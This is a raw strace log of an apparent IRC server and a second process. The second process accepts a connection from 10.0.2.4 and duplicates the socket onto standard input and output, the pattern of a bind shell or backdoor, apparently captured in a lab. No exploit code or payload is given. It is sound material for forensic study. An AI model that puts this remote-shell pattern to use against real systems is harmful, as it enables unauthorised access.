4519  07:41:34.994108 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994122 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994137 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994150 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994164 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994177 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994191 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994205 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994218 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994231 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994245 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994258 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994272 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994286 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994309 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994322 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994336 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994350 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994365 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994379 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994392 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
4519  07:41:34.994411 gettimeofday({1495626094, 994415}, NULL) = 0
4519  07:41:34.994422 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
12269 07:41:35.333942 <... accept resumed> {sa_family=AF_INET, sin_port=htons(40689), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
12269 07:41:35.334025 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bfb58) = -1 EINVAL (Invalid argument)
12269 07:41:35.334056 _llseek(8, 0, 0xbf9bfba0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12269 07:41:35.334069 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bfb58) = -1 EINVAL (Invalid argument)
12269 07:41:35.334079 _llseek(8, 0, 0xbf9bfba0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12269 07:41:35.334089 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
12269 07:41:35.334134 close(6)          = 0
12269 07:41:35.334202 dup(8)            = 6
12269 07:41:35.334216 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c09f8) = -1 EINVAL (Invalid argument)
12269 07:41:35.334227 _llseek(6, 0, 0xbf9c0a40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12269 07:41:35.334237 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
12269 07:41:35.334256 dup2(6, 1)        = 1
12269 07:41:35.334268 close(6)          = 0
12269 07:41:35.334279 fcntl64(1, F_SETFD, 0) = 0
12269 07:41:35.334289 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c09c8) = -1 EINVAL (Invalid argument)
12269 07:41:35.334307 _llseek(1, 0, 0xbf9c0a10, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12269 07:41:35.334337 dup(8)            = 6
12269 07:41:35.334349 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c09f8) = -1 EINVAL (Invalid argument)
12269 07:41:35.334359 _llseek(6, 0, 0xbf9c0a40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12269 07:41:35.334369 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
12269 07:41:35.334385 dup2(6, 0)        = 0
12269 07:41:35.334395 close(6)          = 0
12269 07:41:35.334405 fcntl64(0, F_SETFD, 0) = 0
12269 07:41:35.334418 fcntl64(0, F_SETFD, 0) = 0
12269 07:41:35.334434 read(0,  <unfinished ...>
4519  07:41:35.334748 <... select resumed> ) = 1 (in [5], left {0, 660000})
4519  07:41:35.334773 clock_gettime(CLOCK_MONOTONIC, {2905, 151786564}) = 0
4519  07:41:35.334788 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:41:35.334802 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:41:35.334823 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:41:35.334839 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:41:35.334874 close(5)          = 0
4519  07:41:35.334888 time(NULL)        = 1495626095
4519  07:41:35.334901 time(NULL)        = 1495626095
4519  07:41:35.334915 gettimeofday({1495626095, 334919}, NULL) = 0
4519  07:41:35.334927 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:41:35.334956 clock_gettime(CLOCK_MONOTONIC, {2905, 151969040}) = 0
4519  07:41:35.334967 gettimeofday({1495626095, 334970}, NULL) = 0
4519  07:41:35.334990 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
12269 07:41:35.851100 <... read resumed> "", 4096) = 0
12269 07:41:35.851288 close(8)          = 0
12269 07:41:35.851439 exit_group(0)     = ?
